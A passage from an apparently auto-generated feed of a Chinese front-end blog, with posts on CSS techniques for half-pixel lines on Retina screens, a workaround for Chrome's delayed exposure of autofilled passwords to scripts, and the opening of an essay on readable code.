    <content type="html"><![CDATA[<p>移动端的兴起才导致前端开发行业的大热，但是也带来了不少新的挑战。</p>
<p>最近我们新做了一个微商城的移动主题，主打移动体验，设计稿借鉴了一些知名的移动商城。但是最后做出来的时候，发现一个很奇怪的地方：我们的成品网站不如其他商城看起来清新。此话怎么说呢，我们当时对比的是基于有赞的一个卖书的店铺，发现他们的商品陈列，中间的分割线看起来更舒服一些，尤其是在 iPhone 上。于是设计找我撕逼，说你这根线给我再细一些，我果断反击说这已经是1像素的最小的线了。设计不服，于是拿出有赞这个店铺跟我做的成品对比，不比不知道，果然，同样是 iPhone6，人家的看起来确实更清新，更细的样子。我当时还以为是视觉的原因，但是都是同样的配色，理论上不应该有如此大的视觉差。于是就有了关于这篇文章的探索。</p>
<a id="more"></a>
<h2 id="普及意义和基础"><a href="#普及意义和基础" class="headerlink" title="普及意义和基础"></a>普及意义和基础</h2><p>在具体说明技术的实现，我觉得有必要说一下我对这个技术的看法和普及的意义，其实这个技术就基于一个目标——画一根 只有 0.5px 粗的线</p>
<p>自然，在我们的认知中，网页设计的最小单元就是一个像素了，实现一条不到 1px 粗的线听起来有点不可思议。但实际上，随着 LED 显示技术的进步和 GPU 芯片的性能日益增进，我们在常见设备中已经具备这个条件去应用了。</p>
<p>首先，了解一下 Retina 屏幕的发展史</p>
<blockquote>
<p>2010年6月8日，苹果公司正式发布了 iPhone 4，这意味着智能移动设备进入了一个全新的时代。对于前端开发而言，iPhone 4 的发布带来的一个新挑战，是其被称为 Retina 的屏幕技术 —— 640x960个像素，塞进了 3.5 英寸的显示屏幕，每英寸的面积里有 327 像素。以此带来的是异常清晰的显示体验，由于正常使用完全看不到像素点的存在，因此又称之为“视网膜屏幕”</p>
<p>题外话：其实我们看高清电视时，如果客厅够大，距离足够远，也是看不到像素点的……所谓的三米变高清，五米抗锯齿。因此在某种使用条件下，分辨率达到一定的标准就足够细腻了，不是说越高越好（因为显卡性能很可能跟不上）</p>
</blockquote>
<p>几年过去了，我们现在市面上的手机，基本最低分辨率也达到了 720P 的标准，更多的是 1080P 和 iPhone 系列的超高清屏幕。<br>那么苹果是如何解决如此细腻的物理像素带来的网页设计的问题呢？</p>
<p>这里引入了两个新概念：一个叫 <strong>缩放比例</strong>（DPR，Device Pixel Ratio），另一个叫 <strong>CSS像素</strong>，先看下表</p>
<table>
<thead>
<tr>
<th style="text-align:center">设备名</th>
<th style="text-align:center">DPR</th>
<th style="text-align:center">物理像素</th>
<th style="text-align:center">CSS像素</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">iPhone 4</td>
<td style="text-align:center">2.0</td>
<td style="text-align:center">960 x 640</td>
<td style="text-align:center">480 x 320</td>
</tr>
<tr>
<td style="text-align:center">iPhone 5</td>
<td style="text-align:center">2.0</td>
<td style="text-align:center">1136 x 640</td>
<td style="text-align:center">568 x 320</td>
</tr>
<tr>
<td style="text-align:center">iPhone 6</td>
<td style="text-align:center">2.0</td>
<td style="text-align:center">1334 x 750</td>
<td style="text-align:center">667 x 375</td>
</tr>
<tr>
<td style="text-align:center">iPhone 6 Plus</td>
<td style="text-align:center">3.0</td>
<td style="text-align:center">1920 × 1080</td>
<td style="text-align:center">736 x 414</td>
</tr>
<tr>
<td style="text-align:center">Android-720P</td>
<td style="text-align:center">3.0</td>
<td style="text-align:center">1920 × 1080</td>
<td style="text-align:center">640 x 360</td>
</tr>
<tr>
<td style="text-align:center">Android-1080P</td>
<td style="text-align:center">3.0</td>
<td style="text-align:center">1920 × 1080</td>
<td style="text-align:center">640 x 360</td>
</tr>
<tr>
<td style="text-align:center">Android-1440P</td>
<td style="text-align:center">3.0</td>
<td style="text-align:center">2560 x 1440</td>
<td style="text-align:center">854 x 480</td>
</tr>
</tbody>
</table>
<p>可以很明确的看到，物理像素的高和宽分别除以缩放比例，就得到了 CSS 像素，下图是更清晰的说明（图源自网络）：<br><img src="/images/半个像素的情怀-CSS像素.png" alt="半个像素的情怀-CSS像素"></p>
<p>更简单地说，DPR 为 2.0 的设备，实际上是用四个像素点来模拟我们网页中的一个点，自然清晰度翻了四倍。</p>
<p>不过这里有一个小小的例外，如果你注意到的话：iPhone 6 Plus 的物理像素除以 DPR 得到的是 640x360，跟表中的并不一致。这里有一个小彩蛋，其实除了 Plus，iPhone 其他均使用 326 的DPI，缩放比例是 2.0。因此同一张图片在 iPhone 的浏览器打开，在 iPhone4／iPhone5／iPhone6 中大小是一样的（这里指实际大小，即拿尺子直接在屏幕量，长度都是 X 厘米），为保持这个特性，基于 iPhone 6 Plus DPI 是 401，理论上苹果的缩放比例应该是 <code>401 / 326 x 2 = 2.46</code>，但是非整数会给开发和设计带来很大的不方便，因此考虑的是向下／向上取整，考虑屏幕尺寸最后取得缩放比例为 3.0，因此进行来适当的缩放，也就是虚拟像素为 2208 × 1242（也就是截图得到的尺寸），再根据上表就得到正确的计算啦。</p>
<blockquote>
<p>其实很多安卓设备即便使用 2K 屏幕，但是如果屏幕有一部分用来做虚拟按键，那么实际上可用物理像素是会比屏幕标注的要“矮”一些的</p>
</blockquote>
<p>这样一来就知道在超高清屏幕中，实现半个 CSS 像素，就是只显示物理像素的一个像素，是有其实际的场景的。那么现在可以着手怎么使用代码实现了。</p>
<h2 id="基于-viewport"><a href="#基于-viewport" class="headerlink" title="基于 viewport"></a>基于 <code>viewport</code></h2><p>前面有提到，CSS 像素其实是一种虚拟的像素，那么基于 <code>viewport</code> 的技术实现就像是把这个虚拟层用代码定义了出来，参考以下代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"initial-scale=1.0, maximum-scale=1.0, user-scalable=no"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这个 <code>meta</code> 标签其实非常常见，我们一般都会加上用来指定在移动浏览器不要进行缩放。但如果你指定了特殊但缩放比例，会出现什么情况呢？如:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"initial-scale=2.0, maximum-scale=2.0, user-scalable=no"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>打开浏览器可以看到，平时正常但页面，现在全部元素都比正常要大一倍，那么反过来呢？道理很明白了，就是让浏览器指定这个虚拟视窗是要缩放的，一个像素粗的元素你只显示成半个像素就好，再配合 CSS 像素的相关约束，于是……</p>
<p>实际上，<a href="https://m.taobao.com/" target="_blank" rel="external">淘宝触屏版</a> 的 <code>&lt;head&gt;</code> 标签中就指定了这个<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"initial-scale=0.5, maximum-scale=0.5, minimum-scale=0.5, user-scalable=no"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>于是淘宝就做到了单线条的显示非常细腻的效果，但是这里要说以下，因为是整体的缩放，所以手淘的在 iPhone 5 页面宽度用 CSS 描述是 <code>640px</code> 完全跟物理像素对应了起来，高！</p>
<p>这里对开发设计的要求是，所以的素材和 CSS 尺寸都是所以浏览设备的 DPR 倍，这就要求一开始要考虑到不同缩放比例的设备兼容性，同时开发时就必须采用百分比布局，否则不同设备兼容性会很糟糕</p>
<h2 id="基于-background-image"><a href="#基于-background-image" class="headerlink" title="基于 background-image"></a>基于 <code>background-image</code></h2><p>这里主要是用到了渐变背景</p>
<p>我们知道，渐变背景是可以指定渐变颜色从哪里开始变化的，那么考虑以下代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></div><div class="line">  <span class="selector-class">.half-pixel</span> &#123;</div><div class="line">    <span class="attribute">height</span>: <span class="number">10px</span>;</div><div class="line">    <span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(to bottom, red 50%, transparent 100%);</div><div class="line">    <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">1px</span>;</div><div class="line">    <span class="attribute">background-repeat</span>: no-repeat;</div><div class="line">  &#125;</div><div class="line">  <span class="selector-class">.hole-pixel</span> &#123;</div><div class="line">    <span class="attribute">border-top</span>: <span class="number">1px</span> solid red;</div><div class="line">  &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"half-pixel"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"hole-pixel"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>我们这里指定背景的高度为 1px，同时在渐变中指定前半部分为红色，后半部分为透明，那么，由于总共高度就只有一个像素，于是渐变从开始为红色，到半个像素的时候开始变为透明。于是最终显示的效果就是看起来好像只有半个像素的红色。</p>
<p>对比第二条使用边框实现的红线，可以发现确实第一条线确实要更细一些。在如此细腻的屏幕中，肉眼是很难具体看到渐变的具体转换的，因此即便不是非常完美的半个像素，却达到了欺骗眼球的效果</p>
<p>这个方法尤其局限性，首先要生成一个完整的元素来使用（虽然通常使用伪元素保证 HTML 的干净），其次渐变背景的兼容性基本只只有现代浏览器支持，最后是，毕竟还是有渐变的</p>
<h2 id="基于-border-image"><a href="#基于-border-image" class="headerlink" title="基于 border-image"></a>基于 <code>border-image</code></h2><p>我们知道，高级浏览器是支持自定义边框背景的，这边跟前面使用背景图片一样，同样利用来背景图片可以被拉伸的特性，考虑以下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></div><div class="line">  <span class="selector-class">.half-pixel</span> &#123;</div><div class="line">    <span class="attribute">border-top</span>: <span class="number">1px</span> solid transparent;</div><div class="line">    <span class="attribute">border-image-source</span>: <span class="built_in">url</span>(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAYAAAAGAQMAAADaAn0LAAAABlBMVEUAAAC/v79T5hyIAAAAAXRSTlMAQObYZgAAAA5JREFUCNdj+MPQAoV/ABg8BAlEsqabAAAAAElFTkSuQmCC);</div><div class="line">    <span class="attribute">border-image-slice</span>: <span class="number">2</span>;</div><div class="line">    <span class="attribute">border-image-repeat</span>: stretch;</div><div class="line">  &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"half-pixel"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<p>其中这里我们的背景图片应该是这样子的：<br><img src="/images/半个像素的情怀-边框图.png" alt="半个像素的情怀-边框图"></p>
<p>同样，由于边框高度设定为一个 CSS像素，而背景图只有一半是可以被看到的，因此在拉伸后看起来就像是只有半个像素。有赞商城就是采用这种方式做的。</p>
<p>实际上这张图就来自有赞商城，我们可以探讨一下为什么这个图片做成 4x4 的可见部分，四周还围绕一个透明像素，其他尺寸不行么？</p>
<p>我个人的分析是：第一点. 做成总宽度为 6 个像素，是考虑到缩放比例不管是 2 还是 3 都可以公用这个代码（公倍数）；第二点，四周围绕一圈透明度，是希望可以边框不管是水平方向还是垂直方向都可以使用同样的代码（图片对称）；第三点，最巧妙的是，设备想要展示的其实是虚线，但我们还是认为完美地模仿来半个像素，看下图：<br><img src="/images/半个像素的情怀-边框图2.png" alt="半个像素的情怀-边框图2"></p>
<p>其实我们看到的是多个红色点排列而成的虚线，但是由于单个点红色部分的面积实际上约一半（4 x 4 ／ 6 x 6 = 0.45），因此最后排成这样的的时候视觉上刚刚感觉是半个像素！真是美妙的视觉欺骗呀</p>
<h2 id="基于-transform"><a href="#基于-transform" class="headerlink" title="基于 transform"></a>基于 <code>transform</code></h2><p>其实前面我们都是通过背景图的拉伸实现的，那么其实考虑以下 CSS3 本身也有拉伸的功能，考虑以下代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></div><div class="line"><span class="selector-class">.half-pixel</span><span class="selector-pseudo">:after</span> &#123;</div><div class="line">  <span class="attribute">content</span>: <span class="string">''</span>;</div><div class="line">  <span class="attribute">display</span>: block;</div><div class="line">  <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="number">#f00</span>;</div><div class="line">  <span class="attribute">transform</span>: <span class="built_in">scaleY</span>(0.5);</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"half-pixel"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>没错，前面代码通过定义一个伪元素并使用 <code>transform: scaleY(0.5)</code> 来拉伸达到让 1px 瘦身的目的，<a href="https://m.jd.com/" target="_blank" rel="external">手机京东</a> 就是使用来这个方法的。</p>
<p>实际上这个方法我个人认为是最合适的，因为不用繁琐的背景图方式，理论上可以缩小放大任意的倍数做到各种粗细的视觉效果，付出的代价仅仅是多一个伪元素，何乐而不为呢？</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>其实经过测试可以知道，半个像素并不只是在 Retina 级别的屏幕上才能看得到，有些浏览器为了兼容 4K 显示器，顺便在普通 1080P 笔记本显示器这种缩放比例为 1.0 的显示器中也会进行显示优化，显示效果是边缘不够清晰，看起来比正常一个像素的要淡一些。不过前面提到，我们可以使用 CSS 媒体查询来知道当前设备的缩放比例，从而写不同的 CSS 规则来进行适配。</p>
<blockquote>
<p>加入以下查询活得半个像素体验 <code>@media only screen and (-webkit-min-device-pixel-ratio: 1.5)</code></p>
</blockquote>
<p>因此 Retina 技术不仅给消费者带来新的视觉体验，也给 Web 开发领域带来新的挑战和创意，友好速搭的设计师们，之前的移动设计稿标准是 640px 横向宽度，前端开发也会考虑到 Retina 屏幕中使用 CSS 媒体查询适配高清大图。但随着 iPhone 6 Plus 系列的推出和 1080P 手机的普及，我们开发的时候已经是按照 DPR 3.0 的标准在进行了，设计稿宽度指导尺寸上升到了 960px（虽然前端开发还没有上升到 <code>@3X</code>，不过这在未来是必然会发生的事情）</p>
<p>任何技术的出现都是因为原有技术的局限性，在可预见的未来，超高清显示器的普及是必然的事情，电视机也从之前的 720P 进化到现在基本上都在热卖 4K 屏，因此是不是有那么一个属性，可以直接控制 CSS像素与物理像素的对应关系呢？</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;移动端的兴起才导致前端开发行业的大热，但是也带来了不少新的挑战。&lt;/p&gt;
&lt;p&gt;最近我们新做了一个微商城的移动主题，主打移动体验，设计稿借鉴了一些知名的移动商城。但是最后做出来的时候，发现一个很奇怪的地方：我们的成品网站不如其他商城看起来清新。此话怎么说呢，我们当时对比的是基于有赞的一个卖书的店铺，发现他们的商品陈列，中间的分割线看起来更舒服一些，尤其是在 iPhone 上。于是设计找我撕逼，说你这根线给我再细一些，我果断反击说这已经是1像素的最小的线了。设计不服，于是拿出有赞这个店铺跟我做的成品对比，不比不知道，果然，同样是 iPhone6，人家的看起来确实更清新，更细的样子。我当时还以为是视觉的原因，但是都是同样的配色，理论上不应该有如此大的视觉差。于是就有了关于这篇文章的探索。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>我发现了 Chrome 的一个 Bug</title>
    <link href="https://github.com/Hyifu/2016/07/16/%E6%88%91%E5%8F%91%E7%8E%B0%E4%BA%86Chrome%E7%9A%84%E4%B8%80%E4%B8%AABug/"/>
    <id>https://github.com/Hyifu/2016/07/16/我发现了Chrome的一个Bug/</id>
    <published>2016-07-15T16:00:00.000Z</published>
    <updated>2017-04-24T02:22:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>Chrome 浏览器作为目前最受欢迎的浏览器之一，实在是又快又安全（又耗电又费内存），然而我在开发我们的店铺系统的时候，无意间发现有一个小 bug（其他浏览器均不会出现这种情况）</p>
<a id="more"></a>
<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>这段时间在开发我们的店铺系统，这中间一定会有的内容是登录注册之类模块。在这之前，由于 UI 的要求，我们需要在 PC 端自己实现一个完整的输入框组件，这个组件具备一个特别的动画效果：自己实现来一个缩小移动的 <code>placeholder</code> 提示。</p>
<p>你可以查看 <a href="http://moren.v.youhaosuda.com/" target="_blank" rel="external">示例店铺</a>，具体的效果如下：<br><img src="/images/我发现了Chrome的一个Bug-demo.png" alt="半个像素的情怀-CSS像素"></p>
<p>那么为什么说出现来一个 “BUG” 呢？首先来复现一下：<br>step1: 登录网站，一般 Chrome 就会提示是否记住密码，选择记住；<br>step2: 退出该账户，然后刷新页面，一般 Chrome 就会自动帮你填充表单，于是有很大概率出现下图：<br><img src="/images/我发现了Chrome的一个Bug-bug.png" alt="半个像素的情怀-CSS像素"></p>
<p>这就是问题所在来，我们希望的效果是跟用户名那样子，而不是现在输入提示和自动填充的密码小圆点重叠在一起！这对我造成来很大的困扰。</p>
<p>当然，我也在怀疑自己的代码的问题，那么就先来研究一下这个输入框的触发机制到底是怎样的。</p>
<h2 id="糟糕的挖坑历程"><a href="#糟糕的挖坑历程" class="headerlink" title="糟糕的挖坑历程"></a>糟糕的挖坑历程</h2><p>所有类似的输入框我都封装了一个叫 <code>yhsdINPUT</code> 的类，里面有一些共有的方法和属性，通过实例化对象得到针对特殊输入框的行为，抛开这些，我们单就针对密码框谈一谈核心逻辑：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> $input = $(<span class="string">'#password'</span>)</div><div class="line">  $input.one(<span class="string">'input propertychange'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 为方便展示，重新编排了实现，换成假如加上一个 class 就会触发特效</span></div><div class="line">    $input.val() &amp;&amp; $input.addClass(<span class="string">'active'</span>)</div><div class="line">  &#125;)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<p>逻辑可以简单认为这样：页面加载后，给输入框绑定一次性事件监听，当输入框出现了内容，就会给其加上一个 <code>active</code> 的 Class 表示当前输入框已经激活／有内容（这里不考虑复原问题如删除内容并移除焦点），因为是针对浏览器的自动填充的，所以这个逻辑理论上是正常的，因为自动填充表单会触发 <code>propertychange</code> 才是正常的逻辑。</p>
<p>经过我们的测试，浏览器们表现在意料之中，唯独 Chrome 例外</p>
<p>那么这说明什么问题呢？我得到第一次结论是，Chrome 的自动填充并不会触发输入框的 <code>propertychange</code> 事件，但密码又确实被填充进去了，于是就会出现前面图片中诡异的 “placeholder” 和密码圆点共存的现象</p>
<h4 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h4><p>为了解决这个问题，我们只好在代码中针对 Chrome 进行 hack，加上了以下的修复代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.navigator.userAgent.indexOf(<span class="string">'Chrome'</span>) &gt; <span class="number">-1</span>) &#123;</div><div class="line">  setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    $input.val() &amp;&amp; $input.addClass(<span class="string">'active'</span>)</div><div class="line">  &#125;, <span class="number">300</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我认为这样可行的理由是：既然不会在变动的时候触发 <code>propertychange</code> 事件，那么我就手动延迟监听输入框，如果被密码填充了，那总该可以取到值。至于 <code>300ms</code>，先随便填一个放上去。</p>
<p>结果……让人失望，还是没有预想中的效果，我还特意把时间改为长达 1 秒，然并卵。</p>
<h4 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h4><p>经过第一次尝试，我发现似乎 Chrome 自动填充的密码有两个特性：一是不会触发输入框自带的事件，二是用脚本取不到密码的存在。<br>于是打开劫持工具，加入断点，有一些新发现。</p>
<p>Chrome 并不会在一进来就填充表单，甚至可以说是填充表单是已经执行完脚本后面的时，因此 <code>DOM ready</code> 的时候，脚本嗅探不到值。但是为什么我特意延迟脚本嗅探也还是拿不到值呢？</p>
<p>焦灼地倒腾了半天，使用 <code>debugger</code> 调试出现了奇怪的事情：通过代码 <code>$(&#39;input&#39;).val()</code> 要么一直拿不到值（显示为空字符串，但明明界面是存在密码的，查看 DOM 修改 <code>type=‘text’</code> 也可以让密码明文显示），要么是一直可以拿到值……</p>
<h4 id="发现秘密"><a href="#发现秘密" class="headerlink" title="发现秘密"></a>发现秘密</h4><p>一直到第二天，快要崩溃的时候，我发现如果我与页面 <strong>交互过</strong>，比如随便点击了一下页面，反正就是页面有获得焦点（在控制台输入代码并没有让页面获得焦点），那么就可以通过代码 <code>$(&#39;input&#39;).val()</code> 拿到密码！</p>
<p>最最最奇怪的是，当你第一次与页面交互时，居然触发了之前死活不触发的 <code>propertychange</code> 事件（这里指最开始的 <code>$input.one(handle)</code>），也就是跟你期望一开始就发生的一样，只是延迟到了这个点。</p>
<h4 id="勉强的解决方式"><a href="#勉强的解决方式" class="headerlink" title="勉强的解决方式"></a>勉强的解决方式</h4><p>有了新发现就好办了，我思考了几十分钟，认为这个是 Chrome 的一个安全机制，那么在用户开始与页面交互之前，用脚本是无法知道密码到底有没有被自动填充的，可以放弃前面的思路了。但是我也注意到，只有密码输入框会被这样限制，用户名那一栏是一切如期待进行中的。</p>
<p>这里我想到了一个曲线救国的方案：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.navigator.userAgent.indexOf(<span class="string">'Chrome'</span>) &gt; <span class="number">-1</span>) &#123;</div><div class="line">  setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 找到用户名</span></div><div class="line">    <span class="keyword">var</span> usr = $input.parents().find(<span class="string">'.input[type=text]'</span>)</div><div class="line">    usr.val() &amp;&amp; $input.addClass(<span class="string">'active'</span>)</div><div class="line">  &#125;, <span class="number">300</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>很精妙吧？我们已经没法一开始就拿到密码，但是自动表单填充有一个地方被我注意到了：那就是自动填充总是成对出现的，在这个登录场景中，如果用户名没有被自动填充，密码肯定也没有。因此只需要判断用户名有没有被自动填充，就可以判断密码框的状态了！</p>
<p>实际测试，一切如我所料地工作。然而好景不长，同事在虚拟机中测试时并没有按预料的触发，于是我又得出一个结论：在低端机器中，自动表单填充受限于机器性能，会不止 300ms，而这时，代码已经执行完了。</p>
<p>于是最终我上线的版本是这样的：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.navigator.userAgent.indexOf(<span class="string">'Chrome'</span>) &gt; <span class="number">-1</span>) &#123;</div><div class="line">  <span class="keyword">var</span> times = <span class="number">0</span> <span class="comment">// 给定一个计数器，最多重复20次，超过一秒我就认为没有填充</span></div><div class="line">  (<span class="function"><span class="keyword">function</span> <span class="title">loop</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    times++</div><div class="line">    <span class="keyword">var</span> usr = $input.parents().find(<span class="string">'.input[type=text]'</span>)</div><div class="line">    <span class="keyword">if</span> (usr.val()) &#123;</div><div class="line">      $input.addClass(<span class="string">'active'</span>)</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (times &lt; <span class="number">20</span>) &#123;</div><div class="line">      setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        loop()</div><div class="line">      &#125;, <span class="number">50</span>)</div><div class="line">    &#125;</div><div class="line">  &#125;)()</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="追踪"><a href="#追踪" class="headerlink" title="追踪"></a>追踪</h1><p>总算项目中实现了设计师的要求，但这究竟是 Chrome 的一个 bug，还是我的实现有问题呢？抱着这个问题，我们先搜索一下网络，经过艰难的检索（事实上貌似很少有人会遇到这个奇怪的需求），我居然直接就在 <code>chromium</code> 的 bug<br> 反馈专区找到了这个 issue：<br> <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=378419" target="_blank" rel="external">Issue 378419</a></p>
<p> 嗯，是14年中的问题，基本没人关注，甚至刚报上去的时候，版主还认为是原生的 <code>placeholder</code> 中的 bug（笑）<br> issues 中明确了只有 Chrome 会出现自动填充密码的 <code>input.value === &quot;&quot; // true</code>，里面果然出现了关键信息</p>
<blockquote>
<p>It seems to me that for some reason the autocompletion GUI state (visible password dots) is inconsistent with the DOM state (input.value == “”) until an interaction with the user occurs.</p>
<p>The problem here is that while password.value reports empty string, the control is not actually empty</p>
</blockquote>
<p>然而 Chrome 的开发者认为这确实是正常的逻辑，关闭了这个 issue，这意味着直到现在，Chrome 也还存在着这个特性。</p>
<p>So，我还能说啥呢？因为这既可以认为是一个安全特性，也可以认为是一个体验的缺陷。不过我想，如果你也遇到了同样的问题，那么，我这一趟怼 bug 没有白走，你应该知道怎么 hack 了吧？</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Chrome 浏览器作为目前最受欢迎的浏览器之一，实在是又快又安全（又耗电又费内存），然而我在开发我们的店铺系统的时候，无意间发现有一个小 bug（其他浏览器均不会出现这种情况）&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>我所理解的好代码</title>
    <link href="https://github.com/Hyifu/2016/05/03/%E6%88%91%E6%89%80%E7%90%86%E8%A7%A3%E7%9A%84%E5%A5%BD%E4%BB%A3%E7%A0%81/"/>
    <id>https://github.com/Hyifu/2016/05/03/我所理解的好代码/</id>
    <published>2016-05-02T16:00:00.000Z</published>
    <updated>2017-04-24T14:50:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近对于代码的组织和优化思考了很多，也看完了知名的“蝴蝶书”，本着思考了还是总结一下的原则，还是记录一下自己的认识方便后面嘲讽自己有多么菜</p>
<a id="more"></a>
<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>作为一名菜鸟，实际开发中由于缺乏积累，总是要踩了不少的坑才能发现自己早先到底有多么蠢。于是，许久之前写的店铺系统，维护起来渐渐地发现了很多大坑其实是可以避免的。作为教训，我觉得有必要做一下笔记，也算是写个检讨，因此这里但关注点不是我代码写得到底有多烂，而是如果我下次重新写这么几万行代码的项目，我应该注意到哪些点。</p>
<h2 id="几个标准"><a href="#几个标准" class="headerlink" title="几个标准"></a>几个标准</h2><p>我觉得对于大部分的前端开发工程师（这里主要面向浏览器编程）而言，JS 很多特性可能在工作中永远都不会用到，我们创建一个对象时，99% 的时候不会使用构造对象法，也不会用到位操作符。因此在对这门语言的认知还不足以成为专家的时候，我觉得评价一个人的代码水平的关键点，就是 “可读性好”</p>
<p>可读性，是一个众说纷纭的东西，就好比 JS 到底要不要加分号，代码缩进到底是两个空格还是四个空格，很多时候是谁也不服谁，哪个都有自己有道理但方面，自然我也不想在这里过多地纠缠。</p>
<p>我评价代码的可读性，主要基于以下5个点：</p>
<ol>
<li>直白易懂，没有过多奇淫技巧</li>
<li>遵守一般的最佳实践</li>
<li>团队统一的代码风格</li>
<li>适度使用代码预处理和模块</li>
<li>方便使用版本管理工具</li>
</ol>
<h2 id="简单易懂往往很难做到"><a href="#简单易懂往往很难做到" class="headerlink" title="简单易懂往往很难做到"></a>简单易懂往往很难做到</h2><p>首先阐述第一个点，直白易懂，没有过多奇淫技巧</p>
